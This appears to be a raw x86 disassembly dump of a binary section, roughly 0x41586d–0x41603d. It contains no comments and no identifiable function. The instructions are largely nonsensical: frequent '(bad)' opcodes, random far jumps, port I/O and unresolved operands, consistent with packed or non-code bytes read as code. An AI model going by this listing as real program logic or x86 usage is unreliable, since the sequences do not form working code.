  41586d:	stos   DWORD PTR es:[edi],eax
  41586e:	retf   0xf18f
  415871:	inc    eax
  415872:	mov    edi,0xfe7d619b
  415877:	jb     0x4158e9
  415879:	int    0x1
  41587b:	push   esp
  41587c:	test   eax,0xc52a54a1
  415881:	mov    esp,DWORD PTR [edx+0x60]
  415884:	pusha  
  415885:	cmp    BYTE PTR [edi-0x25],0x1e
  415889:	outs   dx,DWORD PTR ds:[esi]
  41588a:	xor    DWORD PTR [ebx+0x4b],eax
  41588d:	adc    cl,dh
  41588f:	pop    esi
  415890:	(bad)  
  415891:	and    eax,0xf895f569
  415896:	cwde   
  415897:	push   0x2d
  415899:	jg     0x415904
  41589b:	aam    0x4f
  41589d:	xchg   esp,eax
  41589e:	pop    edx
  41589f:	add    BYTE PTR [eax-0x5e],al
  4158a2:	fisubr WORD PTR [ebx+ebp*1+0x72]
  4158a6:	(bad)  
  4158a8:	jnp    0x415854
  4158aa:	xchg   edx,eax
  4158ab:	loope  0x4158a3
  4158ad:	push   esp
  4158ae:	lods   al,BYTE PTR ds:[esi]
  4158af:	inc    edx
  4158b0:	pop    edi
  4158b1:	shl    BYTE PTR [esp+eiz*8-0x76],0x54
  4158b6:	add    al,0x70
  4158b8:	cmp    eax,DWORD PTR [edx-0x29]
  4158bb:	add    esp,edi
  4158bd:	mov    dl,0x6b
  4158bf:	adc    esp,DWORD PTR [esi-0x472660a0]
  4158c5:	jo     0x4158a3
  4158c7:	lahf   
  4158c8:	push   esi
  4158c9:	cmp    eax,0x146e8060
  4158ce:	add    BYTE PTR [ebp-0x64],bh
  4158d1:	loope  0x415933
  4158d3:	test   DWORD PTR [ecx+0x1e501b62],eax
  4158d9:	add    dh,cl
  4158db:	sub    BYTE PTR [edi-0x2a],ch
  4158de:	outs   dx,BYTE PTR ds:[esi]
  4158df:	scas   al,BYTE PTR es:[edi]
  4158e0:	sbb    esp,DWORD PTR [esi+0x22]
  4158e3:	daa    
  4158e4:	sbb    DWORD PTR [esi],esp
  4158e6:	popf   
  4158e7:	push   edi
  4158e8:	(bad)  
  4158e9:	mov    eax,0xc878359a
  4158ee:	add    ebp,DWORD PTR [edx]
  4158f0:	out    dx,al
  4158f1:	pop    ss
  4158f2:	gs (bad) 
  4158f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158f6:	xor    ah,0x1c
  4158f9:	inc    ebp
  4158fa:	mov    ebx,0x35f46c45
  4158ff:	add    al,0x4d
  415901:	call   0x4e82:0x4754d7fa
  415908:	js     0x4158d0
  41590a:	ficomp WORD PTR [ecx+eiz*2]
  41590d:	lods   eax,DWORD PTR ds:[esi]
  41590e:	arpl   WORD PTR [ebx+0x76271654],dx
  415914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415915:	pop    esp
  415916:	mov    eax,0x4534cf53
  41591b:	stos   DWORD PTR es:[edi],eax
  41591c:	in     al,dx
  41591d:	adc    DWORD PTR [ecx-0x5992f93a],ebp
  415923:	pop    ebp
  415924:	pushf  
  415925:	clc    
  415926:	jns    0x4159a5
  415928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415929:	jge    0x415970
  41592b:	enter  0x6299,0x7f
  41592f:	xchg   al,ch
  415931:	jecxz  0x41596c
  415933:	fnstenv [ecx+eax*4]
  415936:	inc    ebx
  415937:	pop    esp
  415938:	in     eax,dx
  415939:	mov    bl,0xdf
  41593b:	outs   dx,BYTE PTR ds:[esi]
  41593c:	inc    esp
  41593d:	mov    ch,0x4b
  41593f:	adc    al,0xf9
  415941:	mov    al,0xdf
  415943:	in     al,dx
  415944:	loope  0x41592d
  415946:	dec    edx
  415947:	or     edi,DWORD PTR [ecx+0x7a8ac51a]
  41594d:	jmp    0xb3f4:0x9f575afb
  415954:	jle    0x4159a7
  415956:	ja     0x4159cf
  415958:	pop    ds
  415959:	call   0xf510:0xcf18faf9
  415960:	(bad)  
  415961:	mov    DWORD PTR [ebx+0x58697508],ecx
  415967:	pop    eax
  415968:	aam    0x60
  41596a:	data16 (bad) 
  41596c:	mov    bl,0xe4
  41596e:	mov    dh,0x71
  415970:	mov    ?,WORD PTR [esp+ebx*8+0x21]
  415974:	out    0x94,al
  415976:	or     ecx,DWORD PTR [ebx-0x186fdf37]
  41597c:	mov    al,0x90
  41597e:	push   edi
  41597f:	xchg   ebp,eax
  415980:	push   ebx
  415981:	and    ch,BYTE PTR [ebx+0x4dc642c8]
  415987:	cmp    cl,BYTE PTR [edi-0x7b]
  41598a:	fisubr WORD PTR [esi]
  41598c:	pop    ds
  41598d:	out    dx,eax
  41598e:	cmc    
  41598f:	dec    ebp
  415990:	mov    edx,0xb8c4b56
  415995:	jmp    edi
  415997:	ja     0x4159c9
  415999:	xchg   ebp,eax
  41599a:	out    0x8b,al
  41599c:	(bad)
  41599f:	int3   
  4159a0:	lea    eax,[esi+ebp*8-0x20]
  4159a4:	mov    esp,0xfbfdbc52
  4159aa:	aad    0xf8
  4159ac:	(bad)  
  4159ad:	fwait
  4159ae:	ss mov dh,0x2d
  4159b1:	mov    ecx,0x560a2a21
  4159b6:	mov    bh,0xae
  4159b8:	mov    bl,0xc7
  4159ba:	int    0xa1
  4159bc:	pop    ebp
  4159bd:	push   ecx
  4159be:	fisttp QWORD PTR [ebp-0x6e]
  4159c1:	(bad)  
  4159c2:	outs   dx,DWORD PTR ds:[esi]
  4159c3:	mov    bl,0x96
  4159c5:	jmp    0x4b78:0x7a586998
  4159cc:	imul   esi,DWORD PTR [eax*2-0x647d3071],0x30
  4159d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159d5:	mov    cl,0x5c
  4159d7:	mov    ch,0x53
  4159d9:	add    al,0xb
  4159db:	test   al,0xe8
  4159dd:	outs   dx,DWORD PTR ds:[esi]
  4159de:	popa   
  4159df:	into   
  4159e0:	jnp    0x4159cd
  4159e2:	adc    eax,0x9d1a7625
  4159e7:	pop    eax
  4159e8:	js     0x415a58
  4159ea:	pushf  
  4159eb:	fimul  WORD PTR fs:[eax+0x19]
  4159ef:	or     eax,0x1c6e7740
  4159f4:	inc    ecx
  4159f5:	push   ds
  4159f6:	jo     0x415a39
  4159f8:	ret    0x84d0
  4159fb:	pop    edi
  4159fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159fd:	bound  esi,QWORD PTR [edi-0x65]
  415a00:	ret    0xeaad
  415a03:	ins    DWORD PTR es:[edi],dx
  415a04:	xchg   edi,eax
  415a05:	adc    DWORD PTR [ecx-0x7a9b11b7],ebp
  415a0b:	and    al,0xce
  415a0d:	mov    eax,ds:0x945503df
  415a12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a13:	push   edi
  415a14:	or     ecx,DWORD PTR [esi-0x53085407]
  415a1a:	pushf  
  415a1b:	fs push ss
  415a1d:	cmp    BYTE PTR [ebx],bl
  415a1f:	fcom   QWORD PTR [ecx+0x66]
  415a22:	or     cl,ah
  415a24:	jae    0x4159d9
  415a26:	loopne 0x4159c1
  415a28:	clc    
  415a29:	(bad)  
  415a2a:	push   ecx
  415a2b:	in     al,dx
  415a2c:	or     ecx,ecx
  415a2e:	and    BYTE PTR [ecx+0x3e],al
  415a31:	mov    ds:0xabcc2a1b,eax
  415a36:	mov    ch,0xe1
  415a38:	repnz mov eax,0x8415fe15
  415a3e:	ins    DWORD PTR es:[edi],dx
  415a3f:	jmp    0x5e45:0x784024d5
  415a46:	addr16 push edi
  415a48:	mov    dl,BYTE PTR [ecx+edx*1]
  415a4b:	cli    
  415a4c:	push   ecx
  415a4d:	es fucomp st(1)
  415a50:	add    DWORD PTR [esp+edx*8],ebp
  415a53:	dec    edx
  415a54:	jb     0x415ad4
  415a56:	adc    eax,0xc58242d9
  415a5b:	dec    ebp
  415a5c:	push   ebx
  415a5d:	imul   ebx,DWORD PTR [esp+edi*8],0x33
  415a61:	imul   edx,DWORD PTR [ebp-0x4],0xbfe51017
  415a68:	(bad)  
  415a69:	(bad)  
  415a6a:	lahf   
  415a6b:	in     al,0x7b
  415a6d:	inc    esi
  415a6e:	retf   0xf79
  415a71:	add    bl,al
  415a73:	push   es
  415a74:	cmp    dh,BYTE PTR [edi-0x500e37d4]
  415a7a:	fistp  QWORD PTR [eax+0x20]
  415a7d:	push   ds
  415a7e:	in     eax,0xa4
  415a80:	sub    esi,DWORD PTR ds:0x72abc38f
  415a86:	mov    esi,0x33315eb7
  415a8b:	ror    DWORD PTR [ebp+0x729c0284],1
  415a91:	xor    al,BYTE PTR [eax]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	inc    esi
  415aa5:	pop    eax
  415aa6:	and    BYTE PTR [edi+0x707f0db8],0xb9
  415aad:	jle    0x415b1f
  415aaf:	jo     0x415a3c
  415ab1:	gs xchg ebx,eax
  415ab3:	pop    ss
  415ab4:	es in  eax,dx
  415ab6:	bound  ebp,QWORD PTR [esi]
  415ab8:	mov    ebx,0x8a48b9ed
  415abd:	inc    edx
  415abe:	in     al,dx
  415abf:	mov    bh,0xdb
  415ac1:	xchg   dx,ax
  415ac3:	push   es
  415ac4:	push   esp
  415ac5:	dec    bx
  415ac7:	xor    ah,BYTE PTR [ecx]
  415ac9:	ret    
  415aca:	les    ebp,FWORD PTR [ebx+0x7a]
  415acd:	in     eax,dx
  415ace:	pusha  
  415acf:	pop    esp
  415ad0:	out    dx,eax
  415ad1:	ror    DWORD PTR [edi+0x35],cl
  415ad4:	adc    dh,BYTE PTR [edx]
  415ad6:	test   cl,al
  415ad8:	xor    eax,DWORD PTR [ebx-0x611ac416]
  415ade:	pop    esi
  415adf:	and    BYTE PTR [ecx-0x6f],ah
  415ae2:	out    0x3e,eax
  415ae4:	(bad)  
  415ae5:	in     eax,0x57
  415ae7:	dec    edx
  415ae8:	add    BYTE PTR es:[ebx+0x29],bh
  415aec:	xchg   esi,eax
  415aed:	xor    dl,BYTE PTR [edi]
  415aef:	jp     0x415a92
  415af1:	mov    dl,0x45
  415af3:	out    0xdf,eax
  415af5:	mov    ds,WORD PTR [eax+0x2deff64a]
  415afb:	out    dx,eax
  415afc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415afd:	or     BYTE PTR [ebx+0x70aca3cf],cl
  415b03:	sbb    al,0x75
  415b05:	sbb    ebx,esp
  415b07:	out    0x96,al
  415b09:	lods   eax,DWORD PTR ds:[esi]
  415b0a:	push   esp
  415b0b:	pop    esi
  415b0c:	sbb    esp,DWORD PTR [esi-0x7e0a139f]
  415b12:	mov    edi,0x69fe9c09
  415b17:	pop    esp
  415b18:	xchg   BYTE PTR [esi+0x55bf9b5b],dl
  415b1e:	sbb    DWORD PTR [ebx+edx*8+0x37],esp
  415b22:	xor    DWORD PTR [ebx-0x7bfd5ed9],esp
  415b28:	aas    
  415b29:	adc    BYTE PTR [eax],dh
  415b2b:	in     al,0xb0
  415b2d:	ds sub eax,0x96c92d8a
  415b33:	cs mov edx,0x8cbef73b
  415b39:	test   bl,dh
  415b3b:	scas   al,BYTE PTR es:[edi]
  415b3c:	mov    ah,0xbf
  415b3e:	(bad)  
  415b3f:	inc    esp
  415b40:	sub    cl,BYTE PTR [edx+0x7eac6367]
  415b46:	xchg   ecx,eax
  415b47:	and    DWORD PTR [edx-0x79f28029],ecx
  415b4d:	fisttp WORD PTR [esi+eiz*4-0x3fb95b67]
  415b54:	pusha  
  415b55:	out    dx,eax
  415b56:	addr16 cli 
  415b58:	mov    esi,0xb5136319
  415b5d:	sahf   
  415b5e:	or     esi,DWORD PTR [eax-0xb4f7434]
  415b64:	bound  eax,QWORD PTR [ebx-0x16]
  415b67:	nop
  415b68:	or     DWORD PTR [ebp-0x78],0x4b190821
  415b6f:	ds retf 0xbe72
  415b73:	and    bh,ah
  415b75:	mov    bh,0x3
  415b77:	add    DWORD PTR [ecx-0x6852094],edx
  415b7d:	lds    ecx,FWORD PTR [eax+ecx*4-0x37]
  415b81:	xchg   edi,eax
  415b82:	fild   WORD PTR [esi+ebx*8-0x77]
  415b86:	push   ebp
  415b87:	or     DWORD PTR [edi+edx*4+0x62],esi
  415b8b:	push   ebp
  415b8c:	(bad)  
  415b8d:	sub    eax,0x959babe0
  415b92:	push   edi
  415b93:	dec    ebx
  415b94:	inc    esp
  415b95:	xlat   BYTE PTR ds:[ebx]
  415b96:	sub    cl,BYTE PTR [ecx]
  415b98:	ror    BYTE PTR [ebp+0x688ded11],cl
  415b9e:	add    DWORD PTR [ebx-0x3a],esi
  415ba1:	sub    DWORD PTR [esi-0x28],ecx
  415ba4:	add    BYTE PTR [ebx-0x52],bl
  415ba7:	sub    al,0x9a
  415ba9:	dec    edx
  415baa:	add    ah,BYTE PTR [edx-0x7d]
  415bad:	pop    ss
  415bae:	inc    ebx
  415baf:	push   ds
  415bb0:	inc    edx
  415bb1:	xchg   edi,eax
  415bb2:	fdivr  DWORD PTR [ecx-0x1b]
  415bb5:	(bad)  [edi+0x7755d30b]
  415bbb:	jno    0x415bb5
  415bbd:	dec    esi
  415bbe:	jbe    0x415c02
  415bc0:	jmp    0xa3fa:0xd3959b91
  415bc7:	push   esp
  415bc8:	dec    eax
  415bc9:	or     al,0xc5
  415bcb:	dec    ecx
  415bcc:	ficom  DWORD PTR [ecx]
  415bce:	sar    BYTE PTR [ebx+0x3cfae280],1
  415bd4:	mov    ecx,0xeb0fbeb7
  415bd9:	xor    eax,0x5240b1de
  415bde:	xor    ch,BYTE PTR [ecx-0x47]
  415be1:	jbe    0x415bd3
  415be3:	xchg   ebp,eax
  415be4:	mov    ch,BYTE PTR [edx-0x71]
  415be7:	(bad)  
  415be8:	lahf   
  415be9:	pop    edi
  415bea:	aad    0xfb
  415bec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bed:	inc    ecx
  415bee:	rcl    ebp,0x43
  415bf1:	not    BYTE PTR [ebx]
  415bf3:	add    DWORD PTR [eax+edx*1+0x1f38cde0],ebp
  415bfa:	mov    ds:0x76f0f880,eax
  415bff:	sub    esp,DWORD PTR [ebx]
  415c01:	sbb    eax,0x1dc2e437
  415c06:	adc    eax,0x8fe4de7b
  415c0b:	cdq    
  415c0c:	dec    BYTE PTR [ecx-0x4a]
  415c0f:	xchg   esi,eax
  415c10:	fidiv  DWORD PTR [ecx-0x49]
  415c13:	rol    DWORD PTR [ecx+edx*8-0x36d1358d],1
  415c1a:	dec    esi
  415c1b:	(bad)  
  415c1c:	scas   eax,DWORD PTR es:[edi]
  415c1d:	imul   edi,ecx,0x335e1325
  415c23:	mov    WORD PTR [esi+eax*4],?
  415c26:	mov    ebx,0x2f7f6bb4
  415c2b:	data16 jno 0x415c81
  415c2e:	mov    al,ds:0xf96df200
  415c33:	retf   0x5e15
  415c36:	jg     0x415c24
  415c38:	loope  0x415c86
  415c3a:	inc    edx
  415c3b:	add    BYTE PTR [edi],bh
  415c3d:	adc    al,0x4a
  415c3f:	pop    eax
  415c40:	inc    edx
  415c41:	call   0xa7009787
  415c46:	inc    DWORD PTR [ebx-0x445ebf94]
  415c4c:	xchg   esi,eax
  415c4d:	inc    ecx
  415c4e:	aad    0x3a
  415c50:	push   0xffffff87
  415c52:	push   eax
  415c53:	inc    ebp
  415c54:	xor    ah,BYTE PTR [edx]
  415c56:	dec    esi
  415c57:	mov    cl,0xb9
  415c59:	lods   eax,DWORD PTR ds:[esi]
  415c5a:	cdq    
  415c5b:	aam    0x2b
  415c5d:	inc    ebx
  415c5e:	dec    edi
  415c5f:	pop    ecx
  415c60:	inc    ebp
  415c61:	xchg   ecx,eax
  415c62:	push   edx
  415c63:	jl     0x415c88
  415c65:	outs   dx,BYTE PTR ds:[esi]
  415c66:	sbb    al,0xda
  415c68:	loop   0x415bf7
  415c6a:	jae    0x415bf3
  415c6c:	mov    WORD PTR [ebp-0x46363891],?
  415c72:	fadd   QWORD PTR ds:0x3333f323
  415c78:	cld    
  415c79:	add    DWORD PTR [edi+ebx*2-0x51f27d99],eax
  415c80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c81:	mov    bl,ah
  415c83:	iret   
  415c84:	imul   ebx,DWORD PTR [eax],0x8d8b3fb1
  415c8a:	or     al,0x2a
  415c8d:	mov    dl,BYTE PTR [esi+0x236257d2]
  415c93:	loopne 0x415c6b
  415c95:	xor    al,BYTE PTR [esi]
  415c97:	int3   
  415c98:	inc    eax
  415c99:	mov    bh,0xa6
  415c9b:	(bad)  
  415c9c:	mov    ch,0x37
  415c9e:	pushf  
  415c9f:	sbb    ecx,DWORD PTR [ebx+0x35]
  415ca2:	mov    ah,0xec
  415ca4:	sar    DWORD PTR [esi],0x1f
  415ca7:	icebp  
  415ca8:	imul   esp,edi,0xffffff97
  415cab:	pop    DWORD PTR [edi+esi*4]
  415cae:	dec    esp
  415caf:	adc    ebx,edx
  415cb1:	mov    al,ds:0x4072a46d
  415cb6:	arpl   WORD PTR [eax+ebx*2],bx
  415cb9:	aaa    
  415cba:	sbb    bl,bl
  415cbc:	and    al,BYTE PTR [ebx]
  415cbe:	mov    al,0xfa
  415cc0:	out    dx,eax
  415cc1:	arpl   WORD PTR [ebp-0x33],di
  415cc4:	dec    edx
  415cc5:	retf   0xa6d4
  415cc8:	pop    esi
  415cc9:	fsub   DWORD PTR [esi]
  415ccb:	out    dx,eax
  415ccc:	jge    0x415c77
  415cce:	cmp    al,0x3a
  415cd0:	mov    ch,0x8d
  415cd2:	jne    0x415d06
  415cd4:	add    ebx,esi
  415cd6:	xchg   ebp,eax
  415cd7:	fmul   QWORD PTR [ebp+0x3789b5d3]
  415cdd:	mov    ecx,0x3fc2b2c4
  415ce2:	sar    DWORD PTR gs:[edx],1
  415ce5:	inc    esp
  415ce6:	in     eax,dx
  415ce7:	pop    esi
  415ce8:	mov    ebx,0x90a9a006
  415ced:	sub    BYTE PTR [edi-0x56],cl
  415cf0:	and    DWORD PTR [esi],ebp
  415cf2:	retf   
  415cf3:	add    eax,0x76ac6518
  415cf8:	ss dec ebx
  415cfa:	push   edi
  415cfb:	adc    cl,BYTE PTR cs:[eax]
  415cfe:	mov    dl,0x56
  415d00:	xchg   ecx,eax
  415d01:	adc    DWORD PTR [edx+0x8],esi
  415d04:	fadd   st(7),st
  415d06:	and    ebx,DWORD PTR [eax-0xf]
  415d09:	add    dl,BYTE PTR ds:0xbced72da
  415d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d10:	xchg   ebx,eax
  415d11:	mov    cs,eax
  415d13:	loop   0x415cfc
  415d15:	je     0x415cc1
  415d17:	pop    eax
  415d18:	add    BYTE PTR [ebx],ch
  415d1a:	ins    DWORD PTR es:[edi],dx
  415d1b:	test   al,0xe0
  415d1d:	ins    BYTE PTR es:[edi],dx
  415d1e:	test   esi,esp
  415d20:	daa    
  415d21:	mov    ecx,0x12ea69ff
  415d26:	mov    bl,0x62
  415d28:	mov    dl,0x1e
  415d2a:	repnz add ax,0xb014
  415d2f:	add    esi,DWORD PTR [ebp-0x2a08feeb]
  415d35:	mov    ebx,ebx
  415d37:	ffreep st(3)
  415d39:	cmp    al,0xe8
  415d3b:	mov    eax,0x16e0427e
  415d40:	(bad)  
  415d41:	nop
  415d42:	rcl    DWORD PTR [ecx],0x94
  415d45:	mov    al,ds:0x873de3c5
  415d4a:	ret    0x2d78
  415d4d:	shl    DWORD PTR [ebx-0x2534e668],cl
  415d53:	push   ds
  415d54:	mov    bl,0x87
  415d56:	(bad)  
  415d58:	ins    DWORD PTR es:[edi],dx
  415d59:	push   ebp
  415d5a:	jmp    0xc287:0xac3cdb81
  415d61:	jmp    0x4e8e4d40
  415d66:	mov    ebx,0xc301b7b
  415d6b:	sti    
  415d6c:	fisttp QWORD PTR [edi-0xc]
  415d6f:	and    ebp,eax
  415d71:	cdq    
  415d72:	pop    ebp
  415d73:	addr16 loopne 0x415dec
  415d76:	cmp    cl,BYTE PTR [ebx+0x7d8b0855]
  415d7c:	fmul   QWORD PTR [ecx+0x458b9704]
  415d82:	call   0x443d70
  415d87:	add    BYTE PTR [eax-0x21],cl
  415d8a:	mov    edx,0x75a9712b
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	inc    ecx
  415d95:	aam    0x2a
  415d97:	xchg   esi,eax
  415d98:	or     DWORD PTR [edx],0x7eb9707f
  415d9e:	jo     0x415e10
  415da0:	call   0x68c7:0xf48ede9d
  415da7:	xor    al,0x2d
  415da9:	jae    0x415da9
  415dab:	jmp    0xe31e:0xfe46527
  415db2:	or     DWORD PTR [esi+edi*4+0xa],ebx
  415db6:	cmc    
  415db7:	sbb    eax,0xb91f28cd
  415dbc:	cmp    DWORD PTR [ebx],edi
  415dbe:	adc    DWORD PTR [eax],esp
  415dc0:	lea    esi,[ebx-0x11]
  415dc3:	sub    al,0x1c
  415dc5:	out    0xcc,al
  415dc7:	lea    esp,ds:0xe8a136e0
  415dcd:	imul   esi,DWORD PTR [eax+0x109a5fab],0x6ba8478a
  415dd7:	mov    ecx,0x69ddd00e
  415ddc:	sub    eax,0xefe017
  415de1:	xor    eax,0xfd601756
  415de6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415de7:	repnz in al,0x91
  415dea:	xchg   BYTE PTR [esi],ch
  415dec:	inc    ecx
  415ded:	pushf  
  415dee:	test   eax,0xa9b11723
  415df3:	add    al,0x1e
  415df5:	inc    esi
  415df6:	test   eax,0xee35f65e
  415dfb:	and    eax,0xd7269a6d
  415e00:	sbb    ebp,edi
  415e02:	or     eax,0x513aa8da
  415e07:	sbb    DWORD PTR [esi],ebp
  415e09:	jae    0x415dd7
  415e0b:	int3   
  415e0c:	div    ebx
  415e0e:	mov    edx,cs
  415e10:	pusha  
  415e11:	and    al,0xab
  415e13:	fcmovnbe st,st(3)
  415e15:	int    0x8e
  415e17:	mov    ds:0x8a46e8b9,eax
  415e1c:	jg     0x415e15
  415e1e:	ror    DWORD PTR [eax+0x1a6b047a],1
  415e24:	mov    dh,0xc5
  415e26:	mov    eax,0x6336caec
  415e2b:	cli    
  415e2c:	push   eax
  415e2d:	add    ebx,ebp
  415e2f:	ret    0xc819
  415e32:	ror    DWORD PTR [esi+0x5b],1
  415e35:	mov    ch,cl
  415e37:	inc    esi
  415e38:	inc    esp
  415e39:	sub    ax,0x977b
  415e3d:	scas   al,BYTE PTR es:[edi]
  415e3e:	mov    ds:0x64c9a3e9,al
  415e43:	jge    0x415e5f
  415e45:	leave  
  415e46:	push   es
  415e47:	pop    ss
  415e48:	jo     0x415e17
  415e4a:	inc    esp
  415e4b:	popf   
  415e4c:	shl    BYTE PTR [ebx+0x9ea48f9],1
  415e52:	add    bh,BYTE PTR [esi]
  415e54:	xchg   ebp,eax
  415e55:	das    
  415e56:	mov    dh,0x6b
  415e58:	add    eax,0xa00ce777
  415e5d:	dec    esp
  415e5e:	jne    0x415e4c
  415e60:	inc    eax
  415e61:	pop    esp
  415e62:	dec    esp
  415e63:	xor    DWORD PTR [ecx-0x155c2abd],esp
  415e69:	outs   dx,DWORD PTR ds:[esi]
  415e6a:	mul    esp
  415e6c:	add    DWORD PTR [ebx-0xb884c2d],edi
  415e72:	mov    eax,?
  415e74:	cwde   
  415e75:	bound  esi,QWORD PTR [ecx-0x17]
  415e78:	mov    ecx,0x834ba289
  415e7d:	in     al,dx
  415e7e:	int3   
  415e7f:	adc    bh,BYTE PTR ds:0xeca0c939
  415e85:	loope  0x415ee6
  415e87:	jae    0x415e3e
  415e89:	mov    ch,0xd3
  415e8b:	stos   DWORD PTR es:[edi],eax
  415e8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e8d:	or     ebx,DWORD PTR [edi*1+0x4382105d]
  415e94:	test   eax,0x2cfeab10
  415e99:	sti    
  415e9a:	mov    bh,0xcb
  415e9c:	fiadd  WORD PTR [edi-0x112c9344]
  415ea2:	ffree  st(6)
  415ea4:	add    al,0x4d
  415ea6:	xor    eax,0xbf1e616d
  415eab:	sub    ah,BYTE PTR [esp+esi*2-0xd]
  415eaf:	xor    cl,BYTE PTR [ecx-0x6d887bb9]
  415eb5:	aam    0xdf
  415eb7:	add    ah,bh
  415eb9:	lods   al,BYTE PTR ds:[esi]
  415eba:	in     al,dx
  415ebb:	push   0x1a25021c
  415ec0:	aas    
  415ec1:	push   0x4b
  415ec3:	adc    ch,bh
  415ec5:	push   eax
  415ec6:	pop    eax
  415ec7:	ds dec esp
  415ec9:	or     cl,ch
  415ecb:	retf   0x6859
  415ece:	fwait
  415ecf:	cmp    eax,0xe8b9adc1
  415ed4:	jmp    0xaf5b030f
  415ed9:	lahf   
  415eda:	popa   
  415edb:	pop    eax
  415edc:	adc    DWORD PTR [edx+ecx*4+0x419457d3],esp
  415ee3:	mov    ds:0x3a049f08,al
  415ee8:	xor    DWORD PTR [ebx+eax*8+0x57b01a64],edi
  415eef:	loop   0x415e92
  415ef1:	mov    ebx,0x2506f8dc
  415ef6:	pop    esp
  415ef7:	retf   
  415ef8:	es out dx,eax
  415efa:	stc    
  415efb:	mov    fs,WORD PTR [edi]
  415efd:	cmp    BYTE PTR [ebx+0x6c],0x5a
  415f01:	(bad)  
  415f02:	test   eax,0x43f1d06c
  415f07:	xor    ebx,edx
  415f09:	sar    DWORD PTR ds:0x7014e7df,1
  415f0f:	cld    
  415f10:	mov    al,ds:0x9e9bce40
  415f15:	or     ebp,DWORD PTR [edx]
  415f17:	loope  0x415ed3
  415f19:	sbb    eax,0xcc76d488
  415f1e:	inc    eax
  415f1f:	jmp    0xabc4:0x116c07e7
  415f26:	cmp    BYTE PTR [edi],dl
  415f28:	nop
  415f29:	add    BYTE PTR [eax+0x346b4252],ah
  415f2f:	inc    esi
  415f30:	mov    ebp,0xefeb6a46
  415f35:	mov    ebx,0x9201d4e4
  415f3a:	lea    esp,[edi]
  415f3c:	pop    ss
  415f3d:	loop   0x415f4a
  415f3f:	push   cs
  415f40:	jmp    0x3d94390b
  415f45:	dec    ecx
  415f46:	add    bh,BYTE PTR [edx+edx*1-0x17]
  415f4a:	iret   
  415f4b:	es dec ebp
  415f4d:	aaa    
  415f4e:	in     eax,0xc4
  415f50:	and    dl,bl
  415f52:	push   ecx
  415f53:	pop    esp
  415f54:	retf   0x1252
  415f57:	cmc    
  415f58:	(bad)  
  415f5a:	in     al,0xe3
  415f5c:	jno    0x415f00
  415f5e:	maxps  xmm3,XMMWORD PTR [eax-0x53]
  415f62:	pop    edx
  415f63:	and    esi,DWORD PTR [ecx-0x45]
  415f66:	pop    eax
  415f67:	jmp    0x415f88
  415f69:	push   ecx
  415f6a:	daa    
  415f6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f6c:	mov    gs,WORD PTR [eax+0x39]
  415f6f:	les    esp,FWORD PTR [eax]
  415f71:	jbe    0x415f20
  415f73:	in     al,0x14
  415f75:	mov    esi,DWORD PTR [edi]
  415f77:	xor    eax,0x4baaf4c8
  415f7c:	or     BYTE PTR [ebp+0x75],dl
  415f7f:	and    dh,al
  415f81:	into   
  415f82:	sti    
  415f83:	mov    dl,0xb
  415f85:	in     eax,0x8c
  415f87:	ins    DWORD PTR es:[edi],dx
  415f88:	mov    dl,0xb6
  415f8a:	dec    BYTE PTR [eax]
  415f8c:	clc    
  415f8d:	(bad)  
  415f91:	rcr    esi,1
  415f93:	push   0x4b
  415f95:	and    BYTE PTR cs:0x72927d0f,bl
  415f9c:	iret   
  415f9d:	cmc    
  415f9e:	or     ebp,edi
  415fa0:	ins    DWORD PTR es:[edi],dx
  415fa1:	leave  
  415fa2:	cmp    BYTE PTR [edx+esi*1],0xc7
  415fa6:	mov    dh,0x79
  415fa8:	mov    ebx,0xd30f689c
  415fad:	sub    eax,DWORD PTR [esi-0x4a45704a]
  415fb3:	or     eax,0x35833a60
  415fb8:	jmp    0xe409:0xb8f6e020
  415fbf:	in     al,0x49
  415fc1:	add    ah,BYTE PTR [edx-0xba75011]
  415fc7:	pop    esi
  415fc8:	mov    al,ds:0x1b3fa74c
  415fcd:	cld    
  415fce:	mov    ebx,0xe97ca697
  415fd3:	mov    ch,0x16
  415fd5:	rol    DWORD PTR [ecx],cl
  415fd7:	inc    esi
  415fd8:	jns    0x416037
  415fda:	vpunpcklbw ymm7,ymm5,ymm0
  415fde:	ins    DWORD PTR es:[edi],dx
  415fdf:	imul   eax,DWORD PTR [ecx],0xffffffa1
  415fe2:	not    edi
  415fe4:	les    esp,FWORD PTR [ebp+0x77c3fd91]
  415fea:	jb     0x416030
  415fec:	imul   ebp,DWORD PTR [esi+0x630c91b6],0x7
  415ff3:	mov    WORD PTR [ebp+0x1a59a46e],ss
  415ff9:	mov    ecx,ecx
  415ffb:	in     al,dx
  415ffc:	imul   esi,DWORD PTR [ebp-0x7aad5812],0xffffffbe
  416003:	dec    edi
  416004:	and    eax,0xa260a7f8
  416009:	adc    DWORD PTR [ebp-0x2c],eax
  41600c:	jb     0x41606d
  41600e:	adc    al,0x6
  416010:	ret    0x525f
  416013:	cld    
  416014:	xor    ah,0x26
  416017:	idiv   BYTE PTR [ebx+0x44]
  41601a:	mov    eax,0x3e63e6a1
  41601f:	fmul   QWORD PTR [ebp+ebx*4-0x58]
  416023:	ret    0xf13
  416026:	fist   DWORD PTR [eax+0x72]
  416029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41602a:	imul   ebp,DWORD PTR [edx-0x44b5722a],0x17
  416031:	(bad)
  416035:	push   0x61
  416037:	jmp    0xfc8a8000
  41603c:	popf   
  41603d:	inc    ecx
